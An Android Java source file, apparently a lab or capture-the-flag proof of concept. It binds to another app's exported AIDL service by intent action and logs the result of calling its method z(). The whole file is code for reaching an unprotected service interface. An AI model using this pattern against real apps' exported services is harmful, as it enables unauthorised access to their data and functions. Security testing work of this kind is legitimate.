package x.y.z.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import r.s.aidlInterface;

public class MainActivity extends AppCompatActivity {

    private aidlInterface Iservice;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.button);
        View.OnClickListener mBindListener = null;

        ServiceConnection mConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Iservice = aidlInterface.Stub.asInterface(service);
                Log.d("TAG", "onServiceConnected: interface added");
                try {
                    Log.d("TAG", "onServiceConnected: " + Iservice.z());
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.d("TAG", "onServiceConnected: disconnected");
            }
        };

        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Establish a couple connections with the service, binding
                // by interface names.  This allows other applications to be
                // installed that replace the remote service by implementing
                // the same interface.
                boolean b = bindService(new Intent("x.y.z.ServicesOut").setPackage("x.y.z"),
                        mConnection, Context.BIND_AUTO_CREATE);
                Log.d("TAG", "onClick: " + b);
            }
        });
    }
}